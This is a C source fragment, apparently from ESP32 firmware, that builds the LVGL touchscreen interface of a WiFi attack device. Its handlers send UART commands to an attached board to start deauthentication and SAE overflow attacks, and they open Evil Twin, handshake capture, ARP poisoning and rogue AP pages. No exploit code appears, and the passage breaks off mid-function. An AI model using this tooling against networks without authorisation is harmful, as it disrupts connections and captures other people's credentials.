static void create_tab_containers(void)
{
    lv_obj_t *scr = lv_scr_act();
    lv_coord_t height = lv_disp_get_ver_res(NULL) - 85;  // Below status bar + tab bar
    
    // Set initial tab to first detected transport
    if (grove_detected) {
        current_tab = TAB_GROVE;
    } else if (usb_detected) {
        current_tab = TAB_USB;
    } else if (mbus_detected) {
        current_tab = TAB_MBUS;
    } else {
        current_tab = TAB_INTERNAL;  // INTERNAL if no boards detected
    }
    
    // Grove container
    if (grove_detected) {
        grove_container = lv_obj_create(scr);
        lv_obj_set_size(grove_container, lv_pct(100), height);
        lv_obj_align(grove_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(grove_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(grove_container, 0, 0);
        lv_obj_set_style_radius(grove_container, 0, 0);
        lv_obj_set_style_pad_all(grove_container, 0, 0);
        lv_obj_clear_flag(grove_container, LV_OBJ_FLAG_SCROLLABLE);
        if (current_tab != TAB_GROVE) {
            lv_obj_add_flag(grove_container, LV_OBJ_FLAG_HIDDEN);
        }
    }

    // USB container
    if (usb_detected) {
        usb_container = lv_obj_create(scr);
        lv_obj_set_size(usb_container, lv_pct(100), height);
        lv_obj_align(usb_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(usb_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(usb_container, 0, 0);
        lv_obj_set_style_radius(usb_container, 0, 0);
        lv_obj_set_style_pad_all(usb_container, 0, 0);
        lv_obj_clear_flag(usb_container, LV_OBJ_FLAG_SCROLLABLE);
        if (current_tab != TAB_USB) {
            lv_obj_add_flag(usb_container, LV_OBJ_FLAG_HIDDEN);
        }
    }

    // MBus container
    if (mbus_detected) {
        mbus_container = lv_obj_create(scr);
        lv_obj_set_size(mbus_container, lv_pct(100), height);
        lv_obj_align(mbus_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(mbus_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(mbus_container, 0, 0);
        lv_obj_set_style_radius(mbus_container, 0, 0);
        lv_obj_set_style_pad_all(mbus_container, 0, 0);
        lv_obj_clear_flag(mbus_container, LV_OBJ_FLAG_SCROLLABLE);
        // Hide if not the initial tab
        if (current_tab != TAB_MBUS) {
            lv_obj_add_flag(mbus_container, LV_OBJ_FLAG_HIDDEN);
        }
    }
    
    // INTERNAL container - always created
    internal_container = lv_obj_create(scr);
    lv_obj_set_size(internal_container, lv_pct(100), height);
    lv_obj_align(internal_container, LV_ALIGN_TOP_MID, 0, 85);
    lv_obj_set_style_bg_color(internal_container, COLOR_MATERIAL_BG, 0);
    lv_obj_set_style_border_width(internal_container, 0, 0);
    lv_obj_set_style_radius(internal_container, 0, 0);
    lv_obj_set_style_pad_all(internal_container, 0, 0);
    lv_obj_clear_flag(internal_container, LV_OBJ_FLAG_SCROLLABLE);
    // Hide if not the initial tab
    if (current_tab != TAB_INTERNAL) {
        lv_obj_add_flag(internal_container, LV_OBJ_FLAG_HIDDEN);
    }
    
    ESP_LOGI(TAG, "Tab containers created (Grove=%s, USB=%s, MBus=%s, initial_tab=%d)",
             grove_detected ? "YES" : "NO",
             usb_detected ? "YES" : "NO",
             mbus_detected ? "YES" : "NO",
             current_tab);
}

// Reload GUI when hardware config changes (e.g., after board detection)
static void reload_gui_for_detection(void)
{
    ESP_LOGI(TAG, "Reloading GUI (Grove=%s, USB=%s, MBus=%s)",
             grove_detected ? "YES" : "NO",
             usb_detected ? "YES" : "NO",
             mbus_detected ? "YES" : "NO");
    
    lv_obj_t *scr = lv_scr_act();
    lv_coord_t height = lv_disp_get_ver_res(NULL) - 85;
    
    // Handle Grove container based on detection
    if (grove_detected && !grove_container) {
        grove_container = lv_obj_create(scr);
        lv_obj_set_size(grove_container, lv_pct(100), height);
        lv_obj_align(grove_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(grove_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(grove_container, 0, 0);
        lv_obj_set_style_radius(grove_container, 0, 0);
        lv_obj_set_style_pad_all(grove_container, 0, 0);
        lv_obj_clear_flag(grove_container, LV_OBJ_FLAG_SCROLLABLE);
        ESP_LOGI(TAG, "Created Grove container");
    }

    // Handle USB container based on detection
    if (usb_detected && !usb_container) {
        usb_container = lv_obj_create(scr);
        lv_obj_set_size(usb_container, lv_pct(100), height);
        lv_obj_align(usb_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(usb_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(usb_container, 0, 0);
        lv_obj_set_style_radius(usb_container, 0, 0);
        lv_obj_set_style_pad_all(usb_container, 0, 0);
        lv_obj_clear_flag(usb_container, LV_OBJ_FLAG_SCROLLABLE);
        ESP_LOGI(TAG, "Created USB container");
    }
    
    // Handle MBus container based on detection
    if (mbus_detected && !mbus_container) {
        mbus_container = lv_obj_create(scr);
        lv_obj_set_size(mbus_container, lv_pct(100), height);
        lv_obj_align(mbus_container, LV_ALIGN_TOP_MID, 0, 85);
        lv_obj_set_style_bg_color(mbus_container, COLOR_MATERIAL_BG, 0);
        lv_obj_set_style_border_width(mbus_container, 0, 0);
        lv_obj_set_style_radius(mbus_container, 0, 0);
        lv_obj_set_style_pad_all(mbus_container, 0, 0);
        lv_obj_clear_flag(mbus_container, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_add_flag(mbus_container, LV_OBJ_FLAG_HIDDEN);
        ESP_LOGI(TAG, "Created MBus container");
    }
    
    // Recreate tab bar with correct number of tabs
    create_tab_bar();
    
    // Set initial tab to first detected transport
    if (grove_detected) {
        current_tab = TAB_GROVE;
    } else if (usb_detected) {
        current_tab = TAB_USB;
    } else if (mbus_detected) {
        current_tab = TAB_MBUS;
    } else {
        current_tab = TAB_INTERNAL;  // INTERNAL if no boards detected
    }
    update_tab_styles();
    
    ESP_LOGI(TAG, "GUI reloaded successfully, current_tab=%d", current_tab);
}

// Create tab bar below status bar
static void create_tab_bar(void)
{
    lv_obj_t *scr = lv_scr_act();
    
    // Delete existing tab bar if present
    if (tab_bar) {
        lv_obj_del(tab_bar);
        tab_bar = NULL;
        grove_tab_btn = NULL;
        usb_tab_btn = NULL;
        mbus_tab_btn = NULL;
        internal_tab_btn = NULL;
    }
    
    // Create tab bar container with gradient background
    tab_bar = lv_obj_create(scr);
    lv_obj_set_size(tab_bar, lv_pct(100), 45);
    lv_obj_align(tab_bar, LV_ALIGN_TOP_MID, 0, 40);  // Below status bar
    lv_obj_set_style_bg_color(tab_bar, lv_color_hex(0x1A1A2E), 0);
    lv_obj_set_style_bg_grad_color(tab_bar, lv_color_hex(0x16213E), 0);
    lv_obj_set_style_bg_grad_dir(tab_bar, LV_GRAD_DIR_HOR, 0);
    lv_obj_set_style_border_width(tab_bar, 0, 0);
    lv_obj_set_style_radius(tab_bar, 0, 0);
    lv_obj_set_style_pad_all(tab_bar, 4, 0);
    lv_obj_set_style_pad_gap(tab_bar, 8, 0);
    lv_obj_set_flex_flow(tab_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(tab_bar, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(tab_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    // Calculate tab count based on detected transports
    int tab_count = (grove_detected ? 1 : 0) + (usb_detected ? 1 : 0) + (mbus_detected ? 1 : 0) + 1;
    int tab_width = (lv_disp_get_hor_res(NULL) - 24) / tab_count;  // Account for padding and gaps
    
    // ========== Grove tab (only if detected) ==========
    if (grove_detected) {
        grove_tab_btn = lv_btn_create(tab_bar);
        lv_obj_set_size(grove_tab_btn, tab_width, 37);
        lv_obj_set_style_radius(grove_tab_btn, 8, 0);
        lv_obj_set_style_shadow_width(grove_tab_btn, 8, 0);
        lv_obj_set_style_shadow_color(grove_tab_btn, lv_color_hex(TAB_COLOR_UART1_ACTIVE), 0);
        lv_obj_set_style_shadow_opa(grove_tab_btn, LV_OPA_30, 0);
        lv_obj_add_event_cb(grove_tab_btn, tab_click_cb, LV_EVENT_CLICKED, (void*)(uintptr_t)TAB_GROVE);
        
        // Icon + Label container
        lv_obj_t *grove_content = lv_obj_create(grove_tab_btn);
        lv_obj_remove_style_all(grove_content);
        lv_obj_set_size(grove_content, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
        lv_obj_set_flex_flow(grove_content, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(grove_content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_gap(grove_content, 6, 0);
        lv_obj_center(grove_content);
        lv_obj_clear_flag(grove_content, LV_OBJ_FLAG_CLICKABLE);
        
        lv_obj_t *grove_icon = lv_label_create(grove_content);
        lv_label_set_text(grove_icon, LV_SYMBOL_WIFI);
        lv_obj_set_style_text_font(grove_icon, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(grove_icon, lv_color_hex(0xFFFFFF), 0);
        
        lv_obj_t *grove_label = lv_label_create(grove_content);
        lv_label_set_text(grove_label, "GROVE");
        lv_obj_set_style_text_font(grove_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(grove_label, lv_color_hex(0xFFFFFF), 0);
        
        // SD card warning icon (if no SD card)
        if (!grove_ctx.sd_card_present) {
            lv_obj_t *sd_warn = lv_label_create(grove_content);
            lv_label_set_text(sd_warn, LV_SYMBOL_WARNING);
            lv_obj_set_style_text_font(sd_warn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(sd_warn, lv_color_hex(0xFF5722), 0);  // Orange warning
        }
    }

    // ========== USB tab (only if detected) ==========
    if (usb_detected) {
        usb_tab_btn = lv_btn_create(tab_bar);
        lv_obj_set_size(usb_tab_btn, tab_width, 37);
        lv_obj_set_style_radius(usb_tab_btn, 8, 0);
        lv_obj_set_style_shadow_width(usb_tab_btn, 8, 0);
        lv_obj_set_style_shadow_color(usb_tab_btn, lv_color_hex(TAB_COLOR_UART1_ACTIVE), 0);
        lv_obj_set_style_shadow_opa(usb_tab_btn, LV_OPA_30, 0);
        lv_obj_add_event_cb(usb_tab_btn, tab_click_cb, LV_EVENT_CLICKED, (void*)(uintptr_t)TAB_USB);

        // Icon + Label container
        lv_obj_t *usb_content = lv_obj_create(usb_tab_btn);
        lv_obj_remove_style_all(usb_content);
        lv_obj_set_size(usb_content, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
        lv_obj_set_flex_flow(usb_content, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(usb_content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_gap(usb_content, 6, 0);
        lv_obj_center(usb_content);
        lv_obj_clear_flag(usb_content, LV_OBJ_FLAG_CLICKABLE);

        lv_obj_t *usb_icon = lv_label_create(usb_content);
        lv_label_set_text(usb_icon, LV_SYMBOL_USB);
        lv_obj_set_style_text_font(usb_icon, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(usb_icon, lv_color_hex(0xFFFFFF), 0);

        lv_obj_t *usb_label = lv_label_create(usb_content);
        lv_label_set_text(usb_label, "USB");
        lv_obj_set_style_text_font(usb_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(usb_label, lv_color_hex(0xFFFFFF), 0);
        
        // SD card warning icon (if no SD card)
        if (!usb_ctx.sd_card_present) {
            lv_obj_t *sd_warn = lv_label_create(usb_content);
            lv_label_set_text(sd_warn, LV_SYMBOL_WARNING);
            lv_obj_set_style_text_font(sd_warn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(sd_warn, lv_color_hex(0xFF5722), 0);  // Orange warning
        }
    }
    
    // ========== MBus tab (only if MBus detected) ==========
    if (mbus_detected) {
        mbus_tab_btn = lv_btn_create(tab_bar);
        lv_obj_set_size(mbus_tab_btn, tab_width, 37);
        lv_obj_set_style_radius(mbus_tab_btn, 8, 0);
        lv_obj_set_style_shadow_width(mbus_tab_btn, 8, 0);
        lv_obj_set_style_shadow_color(mbus_tab_btn, lv_color_hex(TAB_COLOR_MBUS_ACTIVE), 0);
        lv_obj_set_style_shadow_opa(mbus_tab_btn, LV_OPA_30, 0);
        lv_obj_add_event_cb(mbus_tab_btn, tab_click_cb, LV_EVENT_CLICKED, (void*)(uintptr_t)TAB_MBUS);
        
        // Icon + Label container
        lv_obj_t *mbus_content = lv_obj_create(mbus_tab_btn);
        lv_obj_remove_style_all(mbus_content);
        lv_obj_set_size(mbus_content, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
        lv_obj_set_flex_flow(mbus_content, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(mbus_content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_set_style_pad_gap(mbus_content, 6, 0);
        lv_obj_center(mbus_content);
        lv_obj_clear_flag(mbus_content, LV_OBJ_FLAG_CLICKABLE);
        
        lv_obj_t *mbus_icon = lv_label_create(mbus_content);
        lv_label_set_text(mbus_icon, LV_SYMBOL_GPS);
        lv_obj_set_style_text_font(mbus_icon, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(mbus_icon, lv_color_hex(0xFFFFFF), 0);
        
        lv_obj_t *mbus_label = lv_label_create(mbus_content);
        lv_label_set_text(mbus_label, "MBUS");
        lv_obj_set_style_text_font(mbus_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(mbus_label, lv_color_hex(0xFFFFFF), 0);
        
        // SD card warning icon (if no SD card)
        if (!mbus_ctx.sd_card_present) {
            lv_obj_t *sd_warn = lv_label_create(mbus_content);
            lv_label_set_text(sd_warn, LV_SYMBOL_WARNING);
            lv_obj_set_style_text_font(sd_warn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(sd_warn, lv_color_hex(0xFF5722), 0);  // Orange warning
        }
    }
    
    // ========== INTERNAL tab ==========
    internal_tab_btn = lv_btn_create(tab_bar);
    lv_obj_set_size(internal_tab_btn, tab_width, 37);
    lv_obj_set_style_radius(internal_tab_btn, 8, 0);
    lv_obj_set_style_shadow_width(internal_tab_btn, 8, 0);
    lv_obj_set_style_shadow_color(internal_tab_btn, lv_color_hex(TAB_COLOR_INTERNAL_ACTIVE), 0);
    lv_obj_set_style_shadow_opa(internal_tab_btn, LV_OPA_30, 0);
    lv_obj_add_event_cb(internal_tab_btn, tab_click_cb, LV_EVENT_CLICKED, (void*)(uintptr_t)TAB_INTERNAL);
    
    // Icon + Label container
    lv_obj_t *internal_content = lv_obj_create(internal_tab_btn);
    lv_obj_remove_style_all(internal_content);
    lv_obj_set_size(internal_content, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(internal_content, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(internal_content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(internal_content, 6, 0);
    lv_obj_center(internal_content);
    lv_obj_clear_flag(internal_content, LV_OBJ_FLAG_CLICKABLE);
    
    lv_obj_t *internal_icon = lv_label_create(internal_content);
    lv_label_set_text(internal_icon, LV_SYMBOL_SETTINGS);
    lv_obj_set_style_text_font(internal_icon, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(internal_icon, lv_color_hex(0xFFFFFF), 0);
    
    lv_obj_t *internal_label = lv_label_create(internal_content);
    lv_label_set_text(internal_label, "INTERNAL");
    lv_obj_set_style_text_font(internal_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(internal_label, lv_color_hex(0xFFFFFF), 0);
    
    // SD card warning icon (if no SD card on Tab5)
    if (!internal_sd_present) {
        lv_obj_t *sd_warn = lv_label_create(internal_content);
        lv_label_set_text(sd_warn, LV_SYMBOL_WARNING);
        lv_obj_set_style_text_font(sd_warn, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(sd_warn, lv_color_hex(0xFF5722), 0);  // Orange warning
    }
    
    // Apply active tab styling
    update_tab_styles();
    
    ESP_LOGI(TAG, "Tab bar created: tabs=%d (Grove=%s, USB=%s, MBus=%s)",
             tab_count,
             grove_detected ? "YES" : "NO",
             usb_detected ? "YES" : "NO",
             mbus_detected ? "YES" : "NO");
}

// Main tile click handler
static void main_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Tile clicked: %s", tile_name);
    
    if (strcmp(tile_name, "WiFi Scan & Attack") == 0) {
        show_scan_page();
    } else if (strcmp(tile_name, "Global WiFi Attacks") == 0) {
        show_global_attacks_page();
    } else if (strcmp(tile_name, "Network Observer") == 0) {
        show_observer_page();
    } else if (strcmp(tile_name, "Internal C6 Test") == 0) {
        show_esp_modem_page();
    } else if (strcmp(tile_name, "Karma") == 0) {
        show_karma_page();
    } else if (strcmp(tile_name, "Settings") == 0) {
        show_settings_page();
    } else if (strcmp(tile_name, "Compromised Data") == 0) {
        show_compromised_data_page();
    } else if (strcmp(tile_name, "Deauth Detector") == 0) {
        show_deauth_detector_page();
    } else if (strcmp(tile_name, "Bluetooth") == 0) {
        show_bluetooth_menu_page();
    } else {
        // Placeholder for other tiles - show a message
        ESP_LOGI(TAG, "Feature '%s' not implemented yet", tile_name);
    }
}

// Network checkbox event handler - toggle selection (0-based index)
static void network_checkbox_event_cb(lv_event_t *e)
{
    lv_obj_t *cb = lv_event_get_target(e);
    int index = (int)(intptr_t)lv_event_get_user_data(e);  // 0-based index
    bool checked = lv_obj_has_state(cb, LV_STATE_CHECKED);
    
    if (checked) {
        // Add to selected list if not already present and not full
        bool found = false;
        for (int i = 0; i < selected_network_count; i++) {
            if (selected_network_indices[i] == index) {
                found = true;
                break;
            }
        }
        if (!found && selected_network_count < MAX_NETWORKS) {
            selected_network_indices[selected_network_count++] = index;
            ESP_LOGI(TAG, "Selected network index %d (total: %d)", index, selected_network_count);
        }
    } else {
        // Remove from selected list
        for (int i = 0; i < selected_network_count; i++) {
            if (selected_network_indices[i] == index) {
                // Shift remaining elements
                for (int j = i; j < selected_network_count - 1; j++) {
                    selected_network_indices[j] = selected_network_indices[j + 1];
                }
                selected_network_count--;
                ESP_LOGI(TAG, "Deselected network index %d (total: %d)", index, selected_network_count);
                break;
            }
        }
    }
}

// Attack tile event handler for bottom icon bar
static void attack_tile_event_cb(lv_event_t *e)
{
    const char *attack_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Attack tile clicked: %s", attack_name);
    
    if (selected_network_count == 0) {
        ESP_LOGW(TAG, "No networks selected for attack");
        return;
    }
    
    // Log selected networks
    ESP_LOGI(TAG, "Selected %d network(s) for %s attack:", selected_network_count, attack_name);
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        if (idx >= 0 && idx < network_count) {
            ESP_LOGI(TAG, "  [%d] %s (%s)", idx, networks[idx].ssid, networks[idx].bssid);
        }
    }
    
    // Handle Deauth attack
    if (strcmp(attack_name, "Deauth") == 0) {
        // Build select_networks command with 1-based indices
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "select_networks");
        for (int i = 0; i < selected_network_count; i++) {
            int idx = selected_network_indices[i];
            if (idx >= 0 && idx < network_count) {
                char num[8];
                snprintf(num, sizeof(num), " %d", networks[idx].index);  // .index is 1-based
                strncat(cmd, num, sizeof(cmd) - strlen(cmd) - 1);
            }
        }
        
        // Send select_networks command
        uart_send_command_for_tab(cmd);
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Send start_deauth command
        uart_send_command_for_tab("start_deauth");
        
        // Show popup with attacking networks
        show_scan_deauth_popup();
        return;
    }
    
    // Handle Evil Twin attack
    if (strcmp(attack_name, "Evil Twin") == 0) {
        // Check SD card before opening Evil Twin popup
        if (!current_tab_has_sd_card()) {
            show_sd_warning_popup(show_evil_twin_popup);
            return;
        }
        show_evil_twin_popup();
        return;
    }
    
    // Handle SAE Overflow attack
    if (strcmp(attack_name, "SAE Overflow") == 0) {
        if (selected_network_count != 1) {
            ESP_LOGW(TAG, "SAE Overflow requires exactly one network, selected: %d", selected_network_count);
            // Show error in status label if available
            if (status_label) {
                lv_label_set_text(status_label, "Please select just one network");
                lv_obj_set_style_text_color(status_label, COLOR_MATERIAL_RED, 0);
            }
            return;
        }
        
        int idx = selected_network_indices[0];
        int net_1based = networks[idx].index;
        
        // Send select_networks command
        char cmd[32];
        snprintf(cmd, sizeof(cmd), "select_networks %d", net_1based);
        uart_send_command_for_tab(cmd);
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Send sae_overflow command
        uart_send_command_for_tab("sae_overflow");
        
        // Show popup
        show_sae_popup(idx);
        return;
    }
    
    // Handle Handshaker attack
    if (strcmp(attack_name, "Handshaker") == 0) {
        // First show popup, then send commands and start monitoring
        show_handshaker_popup();
        return;
    }
    
    // Handle ARP Poison attack - requires exactly 1 network selected
    if (strcmp(attack_name, "ARP Poison") == 0) {
        if (selected_network_count != 1) {
            ESP_LOGW(TAG, "ARP Poison requires exactly 1 network, selected: %d", selected_network_count);
            if (status_label) {
                bsp_display_lock(0);
                lv_label_set_text(status_label, "Select exactly 1 network for ARP Poison");
                lv_obj_set_style_text_color(status_label, COLOR_MATERIAL_RED, 0);
                bsp_display_unlock();
            }
            return;
        }
        
        // Get the selected network's SSID
        int idx = selected_network_indices[0];
        if (idx >= 0 && idx < network_count) {
            strncpy(arp_target_ssid, networks[idx].ssid, sizeof(arp_target_ssid) - 1);
            arp_target_ssid[sizeof(arp_target_ssid) - 1] = '\0';
        }
        
        show_arp_poison_page();
        return;
    }
    
    // Handle Rogue AP attack - requires exactly 1 network selected
    if (strcmp(attack_name, "Rogue AP") == 0) {
        if (selected_network_count != 1) {
            ESP_LOGW(TAG, "Rogue AP requires exactly 1 network, selected: %d", selected_network_count);
            if (status_label) {
                bsp_display_lock(0);
                lv_label_set_text(status_label, "Select exactly 1 network for Rogue AP");
                lv_obj_set_style_text_color(status_label, COLOR_MATERIAL_RED, 0);
                bsp_display_unlock();
            }
            return;
        }
        
        // Check SD card before opening popup
        if (!current_tab_has_sd_card()) {
            show_sd_warning_popup(show_rogue_ap_page);
            return;
        }
        
        show_rogue_ap_page();
        return;
    }
}

// Close callback for scan deauth popup - sends stop command
static void scan_deauth_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Deauth popup closed - sending stop command");
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Delete overlay (popup is child, will be deleted too)
    tab_context_t *ctx = get_current_ctx();
    if (ctx && ctx->scan_deauth_overlay) {
        lv_obj_del(ctx->scan_deauth_overlay);
        ctx->scan_deauth_overlay = NULL;
        ctx->scan_deauth_popup = NULL;
    }
}

// Show deauth popup with list of selected networks being attacked
static void show_scan_deauth_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->scan_deauth_popup != NULL) return;  // Already showing in this tab
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->scan_deauth_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->scan_deauth_overlay);
    lv_obj_set_size(ctx->scan_deauth_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->scan_deauth_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->scan_deauth_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->scan_deauth_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->scan_deauth_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->scan_deauth_popup = lv_obj_create(ctx->scan_deauth_overlay);
    lv_obj_set_size(ctx->scan_deauth_popup, 550, 450);
    lv_obj_center(ctx->scan_deauth_popup);
    lv_obj_set_style_bg_color(ctx->scan_deauth_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->scan_deauth_popup, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(ctx->scan_deauth_popup, 2, 0);
    lv_obj_set_style_radius(ctx->scan_deauth_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->scan_deauth_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->scan_deauth_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->scan_deauth_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->scan_deauth_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->scan_deauth_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->scan_deauth_popup, 12, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->scan_deauth_popup);
    lv_label_set_text(title, "Attacking networks:");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    
    // Scrollable container for network list
    lv_obj_t *list_cont = lv_obj_create(ctx->scan_deauth_popup);
    lv_obj_set_size(list_cont, lv_pct(100), 280);
    lv_obj_set_style_bg_color(list_cont, lv_color_hex(0x0A0A1A), 0);
    lv_obj_set_style_border_width(list_cont, 0, 0);
    lv_obj_set_style_radius(list_cont, 8, 0);
    lv_obj_set_style_pad_all(list_cont, 12, 0);
    lv_obj_set_flex_flow(list_cont, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_cont, 8, 0);
    lv_obj_add_flag(list_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Add each selected network to the list
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        if (idx >= 0 && idx < network_count) {
            wifi_network_t *net = &networks[idx];
            
            // Network item container
            lv_obj_t *item = lv_obj_create(list_cont);
            lv_obj_set_size(item, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(item, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_border_width(item, 0, 0);
            lv_obj_set_style_radius(item, 6, 0);
            lv_obj_set_style_pad_all(item, 10, 0);
            lv_obj_set_flex_flow(item, LV_FLEX_FLOW_COLUMN);
            lv_obj_set_style_pad_row(item, 4, 0);
            lv_obj_clear_flag(item, LV_OBJ_FLAG_SCROLLABLE);
            
            // SSID
            const char *ssid_display = strlen(net->ssid) > 0 ? net->ssid : "(Hidden)";
            lv_obj_t *ssid_label = lv_label_create(item);
            lv_label_set_text_fmt(ssid_label, "%s %s", LV_SYMBOL_WIFI, ssid_display);
            lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
            
            // BSSID, Band and Security
            lv_obj_t *info_label = lv_label_create(item);
            lv_label_set_text_fmt(info_label, "BSSID: %s | %s | %s", net->bssid, net->band, net->security);
            lv_obj_set_style_text_font(info_label, &lv_font_montserrat_12, 0);
            lv_obj_set_style_text_color(info_label, lv_color_hex(0xAAAAAA), 0);
        }
    }
    
    // STOP button
    lv_obj_t *stop_btn = lv_btn_create(ctx->scan_deauth_popup);
    lv_obj_set_size(stop_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_hex(0xCC0000), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, scan_deauth_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn_label = lv_label_create(stop_btn);
    lv_label_set_text(btn_label, "STOP ATTACK");
    lv_obj_set_style_text_font(btn_label, &lv_font_montserrat_18, 0);
    lv_obj_center(btn_label);
}

// ======================= SAE Overflow Attack Functions =======================

// Close SAE popup
static void sae_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "SAE popup closed - sending stop command");
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Delete overlay (popup is child, will be deleted too)
    tab_context_t *ctx = get_current_ctx();
    if (ctx && ctx->sae_popup_overlay) {
        lv_obj_del(ctx->sae_popup_overlay);
        ctx->sae_popup_overlay = NULL;
        ctx->sae_popup = NULL;
    }
}

// Show SAE Overflow popup
static void show_sae_popup(int network_idx)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->sae_popup != NULL) return;  // Already showing in this tab
    
    if (network_idx < 0 || network_idx >= network_count) return;
    
    wifi_network_t *net = &networks[network_idx];
    const char *ssid_display = strlen(net->ssid) > 0 ? net->ssid : "(Hidden)";
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->sae_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->sae_popup_overlay);
    lv_obj_set_size(ctx->sae_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->sae_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->sae_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->sae_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->sae_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
